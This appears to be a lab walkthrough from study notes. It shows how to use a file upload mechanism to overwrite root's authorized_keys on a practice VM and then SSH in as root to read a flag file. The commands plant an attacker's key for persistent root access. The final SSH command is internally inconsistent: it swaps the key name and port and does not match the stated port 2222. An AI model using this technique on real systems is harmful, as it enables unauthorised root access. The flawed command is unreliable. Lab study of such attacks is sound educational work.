1. Follow the steps above on VM #1 to overwrite the **authorized_keys** file with the file upload mechanism. Connect to the system via SSH on port 2222 and find the flag in **/root/flag.txt**.

```bash
# Generate our keys
ssh-keygen
# using name: fileup

# Copy the public key in authorized_keys
cat fileup.pub > authorized_keys

# Upload the file, but change where it will be stored in the inputs
```
![[Pasted image 20250313002108.png]]

```bash
# Clean previous SSH sessions remnants
rm ~/.ssh/known_hosts

# Connect using our private key
ssh -i dt_key -p fileup root@mountaindesserts.com
# Accept (type yes)
```

![[Pasted image 20250313002837.png]]